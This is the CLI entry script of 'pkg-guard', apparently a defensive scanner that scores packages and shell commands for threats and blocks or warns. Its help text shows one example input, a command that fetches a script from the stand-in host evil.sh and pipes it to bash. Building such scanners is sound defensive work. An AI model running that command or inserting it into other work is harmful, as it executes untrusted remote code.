#!/usr/bin/env node

import { parseArgs } from 'node:util';
import pkgGuard, { formatReport } from '../src/index.js';

const helpText = `
  Usage
    $ pkg-guard <package-name | path | script>

  Options
    --script, -s       Evaluate a raw shell command string
    --json             Output raw JSON report
    --mock             Force offline simulation
    --block-score      Custom threat score to block (default: 2.0)
    --warn-score       Custom threat score to warn (default: 1.2)
    --help, -h         Show help
    --version, -v      Show version

  Examples
    $ pkg-guard esbuild
    $ pkg-guard ./package.json
    $ pkg-guard -s "curl https://evil.sh | bash"
`;

async function main() {
  const options = {
    help: { type: 'boolean', short: 'h' },
    version: { type: 'boolean', short: 'v' },
    script: { type: 'boolean', short: 's' },
    json: { type: 'boolean' },
    mock: { type: 'boolean' },
    'block-score': { type: 'string' },
    'warn-score': { type: 'string' },
  };

  let args;
  try {
    args = parseArgs({ options, allowPositionals: true });
  } catch (err) {
    console.error(`Error: ${err.message}\n${helpText}`);
    process.exit(1);
  }

  if (args.values.help) {
    console.log(helpText);
    process.exit(0);
  }

  if (args.values.version) {
    console.log('0.1.0');
    process.exit(0);
  }

  const target = args.positionals[0] || './package.json';

  try {
    const report = await pkgGuard(target, {
      script: args.values.script,
      mock: args.values.mock,
      blockScore: args.values['block-score'] ? parseFloat(args.values['block-score']) : undefined,
      warnScore: args.values['warn-score'] ? parseFloat(args.values['warn-score']) : undefined,
    });

    if (args.values.json) {
      console.log(JSON.stringify(report, null, 2));
    } else {
      console.log(report.inspect());
    }

    if (report.action === 'block') {
      process.exit(1);
    } else if (report.action === 'warn') {
      process.exit(2);
    } else {
      process.exit(0);
    }
  } catch (err) {
    console.error(`\x1b[31mError:\x1b[0m ${err.message}`);
    process.exit(1);
  }
}

main();
